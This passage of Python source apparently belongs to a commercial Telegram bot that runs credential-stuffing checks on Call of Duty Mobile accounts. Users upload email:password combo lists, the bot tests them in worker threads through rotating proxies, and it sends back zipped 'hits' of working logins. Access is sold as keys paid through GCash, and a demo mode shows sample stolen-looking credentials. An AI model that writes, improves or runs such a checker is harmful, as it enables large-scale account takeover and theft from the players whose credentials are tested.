                _thread_sink.buf = io.StringIO()
                _call_buf = _thread_sink.buf
            # ── Thread-safe stdout/stderr redirect ───────────────────────────
            # sys.stdout/stderr are GLOBAL — two threads restoring them in
            # different order corrupts both. Use a thread-local shadow instead:
            # each thread writes to its own StringIO and never touches the global.
            # processaccount output is captured via the thread-local buf above;
            # we only swap the global pointers inside a per-thread lock so the
            # save/restore is atomic per thread.
            _tl_lock = getattr(_thread_sink, '_lock', None)
            if _tl_lock is None:
                _thread_sink._lock = threading.Lock()
                _tl_lock = _thread_sink._lock
            with _tl_lock:
                _prev_out, _prev_err = sys.stdout, sys.stderr
                sys.stdout = sys.stderr = _call_buf
            try:
                processaccount(sess,acct,pwd,cm,dm,ls,str(result_folder),telegram_config=tg_cfg)
            finally:
                with _tl_lock:
                    sys.stdout = _prev_out
                    sys.stderr = _prev_err
                # Scan output for proxy errors before discarding
                try:
                    _out = _call_buf.getvalue().lower().encode("utf-8","ignore")
                except Exception:
                    _out = b""
                _pf = _cur_proxy_file()
                if _pf and _out:
                    _has_err = any(kw in _out for kw in _ERR_KW)
                    with _track_lock:
                        _proxy_attempts[_pf] = _proxy_attempts.get(_pf,0)+1
                        if _has_err:
                            _proxy_errors[_pf] = _proxy_errors.get(_pf,0)+1

            with fl:
                done[0]+=1
            # Mark this index as done in the checkpoint (safe against crash-resume duplicates)
            _mark_done(i)
        except Exception as _proc_err:
            with _fail_lock:
                _fail_count[0] += 1
                if _first_err[0] is None:
                    _first_err[0] = str(_proc_err)

    # ── Silence ALL logging ONCE for the entire run ─────────────────────
    # NOTE: We do NOT redirect sys.stdout/sys.stderr globally here because
    # multiple concurrent run_checker() calls (one per user) would overwrite
    # each other's backup references and cause "I/O on closed file" crashes.
    # Each worker thread handles its own redirect inside process_one() above.
    import logging as _lmod
    _saved_log = _silence_all_loggers()

    try:
        ex = ThreadPoolExecutor(max_workers=MAX_WORKER_THREADS)
        try:
            # ── MEMORY-SAFE: only keep MAX_WORKER_THREADS*2 futures in-flight ──
            # Submitting ALL accounts at once holds every Future in RAM until done.
            # With 5+ concurrent users and large combos this OOM-kills Railway.
            # Instead we use a sliding window: submit the next batch only after
            # the previous batch completes, keeping peak RAM proportional to
            # threads — not to combo size.
            _BATCH = MAX_WORKER_THREADS      # 1x threads keeps RAM minimal on 512MB Railway
            # Use _all_items which already has original indices and skips checkpointed entries
            _items = _all_items
            _idx   = 0
            _active_futs: dict = {}

            while _idx < len(_items) or _active_futs:
                if stop_event.is_set():
                    for f in list(_active_futs): f.cancel()
                    ex.shutdown(wait=False, cancel_futures=True)
                    break

                # Fill up to _BATCH slots
                while _idx < len(_items) and len(_active_futs) < _BATCH:
                    item = _items[_idx]; _idx += 1
                    fut  = ex.submit(process_one, item)
                    _active_futs[fut] = item

                if not _active_futs:
                    break

                # Wait for at least one to finish before submitting more
                import concurrent.futures as _cf
                done_futs, _ = _cf.wait(
                    list(_active_futs), return_when=_cf.FIRST_COMPLETED)
                for f in done_futs:
                    _active_futs.pop(f, None)
                    try: f.result()
                    except: pass
                # Hint GC to reclaim StringIO/session objects from completed futures
                import gc as _gc; _gc.collect()

            else:
                ex.shutdown(wait=False)
        except Exception:
            ex.shutdown(wait=False, cancel_futures=True)
            raise
    finally:
        _restore_all_loggers(_saved_log)
        # Flush any remaining checkpoint entries before returning
        with _ckpt_lock:
            _flush_checkpoint()

    # ── Warn admin if proxy file has high connection error rate ─────────
    # Only fires when ≥80% of captured outputs had connection errors
    # AND at least 20 attempts — matches "Connection aborted / Remote end closed"
    _warn = []
    for _pfn, _att in _proxy_attempts.items():
        _err = _proxy_errors.get(_pfn,0)
        if _att >= 20 and _err/_att >= 0.80:
            _warn.append((_pfn, _att, _err))
    if _warn:
        _warn_lines = "\n".join(
            f"   <code>{f}</code>  {e}/{a} errors ({int(e/a*100)}%)"
            for f,a,e in _warn)
        _warn_text = (
            f" <b>Proxy Warning</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"High error rate detected during checking:\n\n"
            f"{_warn_lines}\n━━━━━━━━━━━━━━━━━━━━\n"
            f"Errors: Connection aborted / Remote end closed\n"
            f"Use /removeproxy or /pasteproxy to replace."
        )
        _cfg_w=load_config()
        for _aid in _cfg_w.get("admin_ids",[]):
            try:
                import requests as _rw
                _rw.post(
                    f"https://api.telegram.org/bot{bot_token}/sendMessage",
                    data={"chat_id":_aid,"text":_warn_text,"parse_mode":"HTML"},
                    timeout=10)
            except: pass

    _dty._HIT_QUEUES.pop(_registry_key, None)
    _hit_queue.put(None)

    # ── Detect: every account failed silently → Processed: 0 ────────────
    # This happens when gsess()/create_thread_session() crashes (e.g. broken
    # proxy config, missing dependency) or processaccount raises for every line.
    # Without this check the user just sees "Finished! Processed: 0" with no clue.
    _processed = ls.get_stats().get("total", 0)
    _valid_items = sum(1 for _, ln in _all_items if ":" in ln)   # lines that would be attempted
    if _processed == 0 and _fail_count[0] > 0 and _fail_count[0] >= min(_valid_items, 5):
        _err_detail = _first_err[0] or "unknown error"
        log.error(f"[{uid}] All {_fail_count[0]} accounts failed in process_one! First error: {_err_detail}")
        return {"error": (f"All {_fail_count[0]:,} accounts failed to check.\n\n"
                          f"First error: {_err_detail[:300]}\n\n"
                          f"Possible causes:\n"
                          f"• Proxy misconfiguration or dead proxies\n"
                          f"• Missing dependency in dec_tyrantv12\n"
                          f"• Network issue on the server\n\n"
                          f"Check Railway logs for details.")}

    return ls.get_stats()


# ════════════════════════════════════════════
#  DELIVER RESULTS
# ════════════════════════════════════════════
async def deliver_results(bot,chat_id,uid,zip_paths,stats,combo_file=None,note="",partial=False):
    """Send results summary + zip(s).
    zip_paths : Path | list[Path] | None
    partial   : True = keep combo, label as partial and continue
    After final delivery: silently backup to admin then delete result files.
    """
    if partial:
        icon = ""; label = "Partial Results"
    elif note:
        icon = ""; label = "Stopped"
    else:
        icon = ""; label = "Finished"
    t = stats.get("total",0)
    clean_kb = InlineKeyboardMarkup([[InlineKeyboardButton(" Delete All Bot Messages",callback_data="delete_all_msgs")]])
    try:
        hits    = stats.get("has_codm", 0)
        total   = t
        valid   = stats.get("valid", 0)
        invalid = stats.get("invalid", 0)
        clean   = stats.get("clean", 0)
        notclean= stats.get("not_clean", 0)
        no_codm = stats.get("no_codm", 0)
        acc_pct = int(hits / valid * 100) if valid else 0
        badge   = _hit_badge(hits)

        _body  = f"{pe(5)} <b>{label}!</b> {pe(5)}\n"
        _body += f"{pe_sep()}\n"
        _body += f"{pe(3)} {badge} {pe(3)}\n"
        _body += f"{pe_sep()}\n"
        _body += f"{pe(2)} <b>RESULTS BREAKDOWN</b> {pe(2)}\n"
        _body += f"{pe_thin()}\n"
        _body += f"{pe(2)} Processed  : <b><code>{total:,}</code></b>\n"
        _body += f"{pe(2)} Valid       : <code>{valid:,}</code>  {pe(1)} Invalid : <code>{invalid:,}</code>\n"
        _body += f"{pe(2)} Clean       : <code>{clean:,}</code>  {pe(1)} Dirty   : <code>{notclean:,}</code>\n"
        _body += f"{pe_sep()}\n"
        _body += f"{pe(3)} 🎯 CODM HITS : <b><code>{hits:,}</code></b>  {pe(1)} No CODM : <code>{no_codm:,}</code>\n"
        if valid:
            _body += f"{pe(1)} Hit Rate  : {_progress_bar(acc_pct)} <code>{acc_pct}%</code>\n"
        _body += f"{pe_sep()}\n"
        if partial:
            _body += f"{pe(3)} 🔄 Partial — checking still continues! {pe(3)}\n"
            _body += f"{pe(1)} Use /check for live stats"
        elif note:
            _body += f"{pe(3)} ⏹ Stopped — results are ready above! {pe(3)}"
        else:
            _body += f"{pe(5)} ✅ CHECKING COMPLETE! {pe(5)}\n"
            _body += f"{pe(2)} Your results file is below! {pe(2)}"
        m=await bot.send_message(chat_id=chat_id,parse_mode=ParseMode.HTML,reply_markup=clean_kb,text=_body)
        if m: track(uid,m.message_id)
    except: pass

    # Normalise to list
    if zip_paths is None: zip_paths=[]
    elif not isinstance(zip_paths,list): zip_paths=[zip_paths]
    zip_paths=[Path(p) for p in zip_paths if p and Path(p).exists() and Path(p).stat().st_size>100]

    if zip_paths:
        total_parts=len(zip_paths)
        for idx,zp in enumerate(zip_paths,1):
            try:
                if total_parts>1:
                    cap=(f" Part {idx}/{total_parts} — "
                         f"{'checking still continues!' if partial else 'your results!'}")
                else:
                    cap=" Partial — new results will follow when ready!" if partial else " Your results — enjoy!"
                with open(zp,"rb") as f:
                    dm=await bot.send_document(chat_id=chat_id,document=f,filename=zp.name,caption=cap)
                if dm: track(uid,dm.message_id)
            except Exception as e:
                em=await bot.send_message(chat_id=chat_id,text=f" Could not send {zp.name}: {e}")
                if em: track(uid,em.message_id)
    else:
        if not partial:
            nm=await bot.send_message(chat_id=chat_id,text=" No hit files (0 results).")
            if nm: track(uid,nm.message_id)

    if combo_file and not partial: del_combo(combo_file)

    # ── After final delivery: delete result folder ──
    if not partial:
        result_folder_d=None
        if zip_paths:
            result_folder_d=Path(zip_paths[0]).parent
        else:
            with sessions_lock:
                rf_str=active_sessions.get(uid,{}).get("result_folder","")
            if rf_str: result_folder_d=Path(rf_str)

        if result_folder_d and result_folder_d.exists():
            del_result_folder(result_folder_d)

# ════════════════════════════════════════════
#  USER COMMANDS
# ════════════════════════════════════════════
async def cmd_start(update,context):
    cfg=load_config(); tg=update.effective_user; uid=str(tg.id)
    ud,_=get_or_create_user(uid,tg.username or "",tg.first_name or "")

    # ── Maintenance mode gate ────────────────────────────────────────────
    if cfg.get("maintenance_mode") and not is_admin(tg.id,cfg):
        maint_msg = cfg.get("maintenance_message","⚙️ Bot is under maintenance. Please try again later.")
        await update.message.reply_text(
            f"{pe(3)} <b>Maintenance Mode</b> {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} {maint_msg} {pe(2)}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Please check back soon!",
            parse_mode=ParseMode.HTML, reply_markup=ReplyKeyboardRemove()); return

    if ud.get("banned") and not is_admin(tg.id,cfg):
        await update.message.reply_text(
            f"{pe(3)} <b>Access Denied</b> {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} You have been <b>banned</b> from this bot. {pe(2)}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Contact admin for support.",
            parse_mode=ParseMode.HTML, reply_markup=ReplyKeyboardRemove()); return

    bot_name = cfg.get("bot_name","Zia Codm Checker Bot")

    if not ud.get("activated") and not is_admin(tg.id,cfg):
        wc = cfg.get("welcome_message","")
        base_txt = (
            f"{pe(5)} <b>{bot_name}</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(3)} Kamusta, <b>{tg.first_name}</b>! {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Wala ka pang key! {pe(2)}\n"
            f"{pe_thin()}\n"
            f"{pe(1)} Pwede kang bumili ng key gamit ang\n"
            f"   <b>GCash</b> — tap ang <b>🛒 Buy Key</b> para sa mga plans!\n"
            f"{pe_thin()}\n"
            f"{pe(1)} O subukan muna ang <b>🎮 Try Demo</b>\n"
            f"   para makita kung gaano kagaling ang bot!\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Kung may key ka na — i-redeem: {pe(2)}\n"
            f"<code>/redeem YOUR_KEY</code>"
        )
        if wc: base_txt += f"\n{pe_sep()}\n{pe(1)} {wc}"
        await update.message.reply_text(base_txt, parse_mode=ParseMode.HTML, reply_markup=kb_no_key()); return

    if not is_admin(tg.id,cfg) and check_key_expiry(uid):
        await update.message.reply_text(
            f"{pe(3)} <b>Key Expired</b> {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Your access key has expired. {pe(2)}\n"
            f"{pe(1)} Contact admin to renew your key.",
            parse_mode=ParseMode.HTML, reply_markup=ReplyKeyboardRemove()); return

    if cfg.get("locked") and not is_admin(tg.id,cfg) and not ud.get("vip"):
        await update.message.reply_text(
            f"{pe(3)} <b>Bot Locked</b> {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Bot is currently locked by admin. {pe(2)}\n"
            f"{pe(1)} Only VIP users can access during lock.",
            parse_mode=ParseMode.HTML, reply_markup=ReplyKeyboardRemove()); return

    is_adm = is_admin(tg.id,cfg)
    is_vip = ud.get("vip",False)
    iv = is_vip or is_adm
    lim = ud.get("custom_limit") or (cfg.get("vip_limit") if iv else cfg.get("global_limit"))
    ml  = cfg.get("max_lines_per_check")
    lim_s = f"\n{pe(1)} Limit       : <code>{lim:,}</code>" if lim else f"\n{pe(1)} Limit       : <code>Unlimited</code>"
    ml_s  = f"\n{pe(1)} Max/session : <code>{ml:,}</code>" if ml else ""
    cd_on,cd_left = check_cooldown(uid,cfg)
    cd_s = ""
    if cd_on:
        h,m_ = int(cd_left//60),int(cd_left%60)
        cd_s = f"\n{pe(1)} Cooldown    : <code>{'%dh %dm'%(h,m_) if h else '%dm'%m_} left</code>"
    exp_s = "" if is_adm else f"\n{pe(1)} Expiry      : {fmt_expiry(ud.get('key_expires_at'))}"
    note_s = f"\n{pe(1)} Note        : <i>{ud.get('note','')}</i>" if ud.get("note") and is_adm else ""

    badge = ""
    if is_adm:   badge = f" {pe(1)} <b>ADMIN</b>"
    elif is_vip: badge = f" {pe(2)} <b>VIP</b>"

    kb = kb_main_admin() if is_adm else kb_main_user()
    uptime_s = int(time.time()-_railway_start)
    uptime_h,uptime_m = uptime_s//3600,(uptime_s%3600)//60
    uptime_str=f"{uptime_h}h {uptime_m}m" if uptime_h else f"{uptime_m}m"

    total_hits  = ud.get("total_hits", 0)
    total_chk   = ud.get("total_checked", 0)
    sessions_c  = ud.get("sessions_count", 0)
    hit_pct     = int(total_hits / total_chk * 100) if total_chk else 0
    badge_rank  = "💎 ADMIN" if is_adm else ("🔥 VIP" if is_vip else "🎮 PLAYER")

    m = await update.message.reply_text(
        f"{pe(5)} <b>{bot_name}</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(3)} {badge_rank} — <b>{tg.first_name}</b> {pe(3)}\n"
        f"{pe(1)} <code>ID: {tg.id}</code>\n"
        f"{pe_sep()}\n"
        f"{pe(2)} <b>YOUR STATS</b> {pe(2)}\n"
        f"{pe_thin()}\n"
        f"{pe(2)} Total Checked : <b><code>{total_chk:,}</code></b>\n"
        f"{pe(3)} Total Hits    : <b><code>{total_hits:,}</code></b>\n"
        f"{pe(1)} Sessions Done : <code>{sessions_c}</code>\n"
        f"{pe(1)} Hit Rate      : {_progress_bar(hit_pct)} <code>{hit_pct}%</code>\n"
        f"{pe_sep()}\n"
        f"{pe(2)} <b>ACCESS INFO</b> {pe(2)}\n"
        f"{pe_thin()}"
        f"{lim_s}{ml_s}{cd_s}{exp_s}{note_s}\n"
        f"{pe_sep()}\n"
        f"{pe(1)} 🕐 Bot Uptime : <code>{uptime_str}</code>\n"
        f"{pe_sep()}\n"
        f"{pe(3)} Ready to check! Tap a button below {pe(3)}",
        reply_markup=kb, parse_mode=ParseMode.HTML)
    if m: track(uid,m.message_id)

    # ── Show announcement if set ────────────────────────────────────────
    ann = cfg.get("announcement_text","").strip()
    if ann:
        am = await update.message.reply_text(
            f"{pe(3)} <b>📢 Announcement</b> {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{ann}",
            parse_mode=ParseMode.HTML)
        if am: track(uid, am.message_id)

async def cmd_redeem(update,context):
    cfg=load_config(); tg=update.effective_user; uid=str(tg.id)
    if not context.args:
        await update.message.reply_text(
            f"{pe(2)} <b>Redeem Key</b> {pe(2)}\n"
            f"{pe_sep()}\n"
            f"Usage: <code>/redeem YOUR_KEY</code>",
            parse_mode=ParseMode.HTML); return
    key=context.args[0].strip(); keys=load_keys()
    if key not in keys:
        await update.message.reply_text(
            f"{pe(2)} <b>Invalid Key</b>\n"
            f"{pe_sep()}\n"
            f" That key does not exist. Contact admin.",
            parse_mode=ParseMode.HTML); return
    kd=keys[key]; used=kd.get("used_by",[])
    if uid in used:
        ud,_=get_or_create_user(uid)
        await update.message.reply_text(
            f"{pe(3)} <b>Already Redeemed!</b> {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Expiry : {fmt_expiry(ud.get('key_expires_at'))} {pe(2)}\n"
            f"{pe_sep()}\n"
            f"{pe(3)} Use /start to begin checking! {pe(3)}",
            parse_mode=ParseMode.HTML); return
    if len(used)>=kd.get("max_users",1):
        await update.message.reply_text(
            f"{pe(2)} <b>Key Maxed Out</b>\n"
            f"{pe_sep()}\n"
            f" Key has reached max usage. Get a new one from admin.",
            parse_mode=ParseMode.HTML); return
    ud,users=get_or_create_user(uid,tg.username or "",tg.first_name or "")
    ud["activated"]=True; ud["key_used"]=key; ud["key_expires_at"]=kd.get("expires_at")
    ud["activated_at"]=datetime.now().isoformat(); ud["key_expired"]=False
    save_users(users); kd.setdefault("used_by",[]).append(uid); save_keys(keys)
    await update.message.reply_text(
        f"{pe(5)} <b>KEY ACTIVATED!</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} Expiry : {fmt_expiry(ud['key_expires_at'])} {pe(2)}\n"
        f"{pe_sep()}\n"
        f"{pe(3)} Tap /start to start checking! {pe(3)}",
        parse_mode=ParseMode.HTML)

async def _do_stop(update,context):
    uid=str(update.effective_user.id)
    tg=update.effective_user; cfg=load_config()
    main_kb=kb_main_admin() if is_admin(tg.id,cfg) else kb_main_user()
    with sessions_lock: sess=active_sessions.get(uid)
    if not sess:
        await update.message.reply_text(
            f"{pe(1)} No active session.", parse_mode=ParseMode.HTML, reply_markup=main_kb); return
    st=sess.get("status","")
    if st=="checking":
        fpath=sess.get("file","")
        try:
            with open(fpath,"r",encoding="utf-8",errors="ignore") as _f:
                rem=sum(1 for ln in _f if ln.strip() and not ln.strip().startswith("==="))
        except: rem=0
        ls2=sess.get("live_stats")
        cur_stats=ls2.get_stats() if ls2 else {}
        processed=cur_stats.get("total",0)
        if rem>0:
            lk=sess.get("lvl_key","lvl_all"); ck=sess.get("cf_key","cf_both")
            ll=LEVEL_OPTIONS.get(lk,LEVEL_OPTIONS["lvl_all"])["label"]
            cl=CLEAN_OPTIONS.get(ck,CLEAN_OPTIONS["cf_both"])["label"]
            m=await update.message.reply_text(
                f"{pe(5)} <b>Pause or Stop?</b> {pe(5)}\n"
                f"{pe_sep()}\n"
                f"{pe(2)} Processed : <code>{processed:,}</code> {pe(2)}\n"
                f"{pe(1)} Remaining : <code>{rem:,}</code> lines\n"
                f"{pe(2)} Level     : {ll} {pe(2)}\n"
                f"{pe(2)} Filter    : {cl} {pe(2)}\n"
                f"{pe_sep()}\n"
                f"{pe(3)} Continue or stop and get results? {pe(3)}",
                reply_markup=kb_stop_prompt(), parse_mode=ParseMode.HTML)
            if m: track(uid,m.message_id)
        else:
            sess["stop_event"].set()
            clear_persisted_session(uid)
            await update.message.reply_text(
                f"{pe(5)} <b>Stop Signal Sent!</b> {pe(5)}\n"
                f"{pe_sep()}\n"
                f"{pe(2)} Results will be zipped and sent shortly. {pe(2)}",
                parse_mode=ParseMode.HTML, reply_markup=main_kb)
    elif st in ("waiting_file","file_received"):
        c=sess.get("file")
        if c: del_combo(c)
        clear_persisted_session(uid)
        with sessions_lock:
            if uid in active_sessions: del active_sessions[uid]
        await update.message.reply_text(
            f"{pe(3)} <b>Session Cancelled</b> {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} File deleted. {pe(2)}\n"
            f"{pe(1)} Tap Check Accounts to start fresh.",
            parse_mode=ParseMode.HTML, reply_markup=main_kb)
    else:
        await update.message.reply_text(
            f"{pe(1)} No active checking session.", parse_mode=ParseMode.HTML, reply_markup=main_kb)

async def cmd_stop(u,c): await _do_stop(u,c)
async def cmd_cancel(u,c): await _do_stop(u,c)

async def cmd_hits_on(update, context):
    """Enable hit notifications for this user (/hitson)."""
    uid=str(update.effective_user.id); tg=update.effective_user; cfg=load_config()
    main_kb=kb_main_admin() if is_admin(tg.id,cfg) else kb_main_user()
    users=load_users()
    if uid not in users:
        await update.message.reply_text(f"{pe(1)} Use /start first.", parse_mode=ParseMode.HTML, reply_markup=main_kb); return
    users[uid]["hits_notif"]=True; save_users(users)
    await update.message.reply_text(
        f"{pe(5)} <b>Hit Notifications: ON</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"You will receive a message for every hit found.\n"
        f"{pe(1)} Tap <b>{BTN_HITS_OFF}</b> to turn off.",
        parse_mode=ParseMode.HTML, reply_markup=main_kb)

async def cmd_hits_off(update, context):
    """Disable hit notifications for this user (/hitsoff)."""
    uid=str(update.effective_user.id); tg=update.effective_user; cfg=load_config()
    main_kb=kb_main_admin() if is_admin(tg.id,cfg) else kb_main_user()
    users=load_users()
    if uid not in users:
        await update.message.reply_text(f"{pe(1)} Use /start first.", parse_mode=ParseMode.HTML, reply_markup=main_kb); return
    users[uid]["hits_notif"]=False; save_users(users)
    await update.message.reply_text(
        f"{pe(2)} <b>Hit Notifications: OFF</b> {pe(2)}\n"
        f"{pe_sep()}\n"
        f"You will no longer receive per-hit messages.\n"
        f"{pe(1)} Tap <b>{BTN_HITS_ON}</b> to turn back on.",
        parse_mode=ParseMode.HTML, reply_markup=main_kb)

async def cmd_demo(update, context):
    """Demo mode — show a fake CODM check to non-key users."""
    tg = update.effective_user; uid = str(tg.id); cfg = load_config()
    bot_name = cfg.get("bot_name","Zia Codm Checker Bot")

    wait_m = await update.message.reply_text(
        f"{pe(5)} <b>DEMO MODE</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} Simulating CODM check... {pe(2)}\n"
        f"{pe(1)} Sandali lang ha, loading...",
        parse_mode=ParseMode.HTML, reply_markup=ReplyKeyboardRemove())
    await asyncio.sleep(2)

    # Fake sample data for demo
    import random as _rnd
    _sample = [
        ("testuser1@gmail.com", "pass123", True,  145, "Server 1"),
        ("sample2@yahoo.com",   "qwerty",  False, 0,   "N/A"),
        ("player3@gmail.com",   "abc123",  True,  312, "Server 2"),
        ("demo4@hotmail.com",   "pass456", False, 0,   "N/A"),
        ("gamer5@gmail.com",    "xyz789",  True,  88,  "Server 1"),
    ]

    # Show animated checking messages
    for i, (email, pw, hit, lvl, srv) in enumerate(_sample, 1):
        await asyncio.sleep(1)
        if hit:
            await update.effective_chat.send_message(
                f"{pe(3)} <b>🎯 LIVE HIT DETECTED!</b> {pe(3)}\n"
                f"{pe_sep()}\n"
                f"📧 Email  : <code>{email}</code>\n"
                f"🔑 Pass   : <code>{pw}</code>\n"
                f"🎮 Level  : <b>{lvl}</b>\n"
                f"🌍 Server : {srv}\n"
                f"{pe_sep()}\n"
                f"{pe(2)} CODM FOUND! {pe(2)}\n"
                f"{pe(1)} <i>[ DEMO MODE — buy key for real results ]</i>",
                parse_mode=ParseMode.HTML)

    await asyncio.sleep(1.5)

    # Delete the wait message
    try: await wait_m.delete()
    except: pass

    # Show demo results card
    demo_stats = {"total": 5, "valid": 5, "invalid": 0, "clean": 3, "not_clean": 2,
                  "has_codm": 3, "no_codm": 2}
    acc_pct = 60
    badge = _hit_badge(3)

    kb_buy = InlineKeyboardMarkup([[
        InlineKeyboardButton("🛒 Bumili ng Key — GCash!", callback_data="gcash_buy")
    ]])

    await update.effective_chat.send_message(
        f"{pe(5)} <b>DEMO RESULTS</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(3)} {badge} {pe(3)}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} <b>RESULTS BREAKDOWN</b> {pe(2)}\n"
        f"{pe_thin()}\n"
        f"{pe(2)} Processed  : <b><code>5</code></b>\n"
        f"{pe(2)} Valid       : <code>5</code>  {pe(1)} Invalid : <code>0</code>\n"
        f"{pe(2)} Clean       : <code>3</code>  {pe(1)} Dirty   : <code>2</code>\n"
        f"{pe_sep()}\n"
        f"{pe(3)} 🎯 CODM HITS : <b><code>3</code></b>  {pe(1)} No CODM : <code>2</code>\n"
        f"{pe(1)} Hit Rate  : {_progress_bar(acc_pct)} <code>{acc_pct}%</code>\n"
        f"{pe_sep()}\n"
        f"{pe(5)} <b>DEMO COMPLETE!</b> {pe(5)}\n"
        f"{pe_thin()}\n"
        f"{pe(2)} Gusto mo ng <b>REAL</b> results? {pe(2)}\n"
        f"{pe(1)} I-unlock ang buong bot — bumili ng key!\n"
        f"{pe(1)} GCash lang — mura at mabilis! 🔥",
        parse_mode=ParseMode.HTML, reply_markup=kb_buy)


async def cmd_buy(update, context):
    """Show GCash payment plans."""
    tg = update.effective_user; cfg = load_config()
    bot_name = cfg.get("bot_name","Zia Codm Checker Bot")
    gcash_num  = cfg.get("gcash_number","09497330622")
    gcash_name = cfg.get("gcash_name","J.Q.")

    await update.message.reply_text(
        f"{pe(5)} <b>BUY A KEY — GCash</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(3)} Piliin ang plan mo! {pe(3)}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} 🔑 1 Day     — ₱50\n"
        f"{pe(2)} 🔑 3 Days    — ₱120\n"
        f"{pe(2)} 🔑 7 Days    — ₱250\n"
        f"{pe(2)} 🔑 30 Days   — ₱800\n"
        f"{pe(3)} 💎 Lifetime  — ₱2,000\n"
        f"{pe_sep()}\n"
        f"{pe(1)} I-tap ang plan para makita ang\n"
        f"   GCash number at payment steps!",
        parse_mode=ParseMode.HTML, reply_markup=kb_gcash_plans())


async def on_photo(update, context):
    """Handle receipt photo for GCash payment."""
    tg = update.effective_user; uid = str(tg.id); cfg = load_config()

    with sessions_lock:
        _await_plan = active_sessions.get(uid, {}).get("awaiting_receipt")

    if not _await_plan:
        return  # Not waiting for a receipt, ignore

    plan = GCASH_PLANS.get(_await_plan, {})
    plan_label = plan.get("label","Unknown")
    plan_price = plan.get("price","?")
    uname = tg.username or tg.first_name or uid

    # Clear awaiting state
    with sessions_lock:
        if uid in active_sessions:
            active_sessions[uid].pop("awaiting_receipt", None)

    # Notify user
    await update.message.reply_text(
        f"{pe(5)} <b>RESIBO NATANGGAP!</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(3)} Plan  : <b>{plan_label}</b> ({plan_price}) {pe(3)}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} Napadala na ang resibo mo sa admin! {pe(2)}\n"
        f"{pe(1)} Hintayin ang approval — usually 5–30 minuto.\n"
        f"{pe(1)} Magrereply ako pag na-approve na! 🙏",
        parse_mode=ParseMode.HTML, reply_markup=ReplyKeyboardRemove())

    # Forward to all admins with approve/deny buttons
    admin_ids = cfg.get("admin_ids", [])
    caption = (
        f"{pe(5)} <b>💳 BAGONG PAYMENT REQUEST!</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} Buyer   : @{uname} (<code>{uid}</code>) {pe(2)}\n"
        f"{pe(2)} Plan    : <b>{plan_label}</b> — {plan_price} {pe(2)}\n"
        f"{pe_sep()}\n"
        f"{pe(3)} Approve o Deny? {pe(3)}"
    )
    for adm_id in admin_ids:
        try:
            photo = update.message.photo[-1]
            await context.bot.send_photo(
                chat_id=adm_id,
                photo=photo.file_id,
                caption=caption,
                parse_mode=ParseMode.HTML,
                reply_markup=kb_gcash_admin(uid, _await_plan))
        except Exception as _e:
            log.warning(f"Could not forward receipt to admin {adm_id}: {_e}")


async def cmd_delete_file(update,context):
    """Delete user's current combo file so they can upload a new one."""
    uid=str(update.effective_user.id); tg=update.effective_user; cfg=load_config()
    main_kb=kb_main_admin() if is_admin(tg.id,cfg) else kb_main_user()
    with sessions_lock: sess=active_sessions.get(uid)
    uc=COMBO_DIR/uid
    existing=list(uc.glob("*.txt")) if uc.exists() else []
    if not existing and (not sess or not sess.get("file")):
        await update.message.reply_text(
            f"{pe(1)} You have no file to delete.", parse_mode=ParseMode.HTML, reply_markup=main_kb); return
    if sess and sess.get("status")=="checking":
        sess["stop_event"].set()
    deleted=[]
    for f in existing:
        try: f.unlink(); deleted.append(f.name)
        except: pass
    if sess and sess.get("file"):
        try:
            fp=Path(sess["file"])
            if fp.exists(): fp.unlink()
            if fp.name not in deleted: deleted.append(fp.name)
        except: pass
    if uc.exists():
        try:
            if not any(uc.iterdir()): uc.rmdir()
        except: pass
    clear_persisted_session(uid)
    with sessions_lock:
        if uid in active_sessions: del active_sessions[uid]
    names=", ".join(f"<code>{n}</code>" for n in deleted) if deleted else "file"
    await update.message.reply_text(
        f"{pe(3)} <b>File Deleted!</b>\n"
        f"{pe_sep()}\n"
        f"{pe(1)} Deleted: {names}\n"
        f"{pe_sep()}\n"
        f"{pe(1)} Tap <b>{BTN_CHECK}</b> to upload a new file.",
        parse_mode=ParseMode.HTML, reply_markup=main_kb)

async def cmd_status(update,context):
    uid=str(update.effective_user.id); tg=update.effective_user; cfg=load_config()
    main_kb=kb_main_admin() if is_admin(tg.id,cfg) else kb_main_user()
    ud,_=get_or_create_user(uid)
    with sessions_lock: sess=active_sessions.get(uid)
    is_adm=is_admin(tg.id,cfg); is_vip=ud.get("vip",False); iv=is_adm or is_vip
    lim=cfg.get("vip_limit") if iv else cfg.get("global_limit")
    cd_on,cd_left=check_cooldown(uid,cfg)
    cd_s=""
    if cd_on:
        h,m_=int(cd_left//60),int(cd_left%60)
        cd_s=f"\n{pe(1)} Cooldown : <code>{'%dh %dm'%(h,m_) if h else '%dm'%m_} left</code>"
    if not sess:
        await update.message.reply_text(
            f"{pe(2)} <b>Your Status</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Checked  : <code>{ud.get('total_checked',0):,}</code>\n"
            f"{pe(1)} Sessions : <code>{ud.get('sessions_count',0)}</code>\n"
            f"{pe(1)} Limit    : <code>{lim or 'Unlimited'}</code>{cd_s}\n"
            f"{pe(1)} Expiry   : {fmt_expiry(ud.get('key_expires_at'))}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} No active session.",
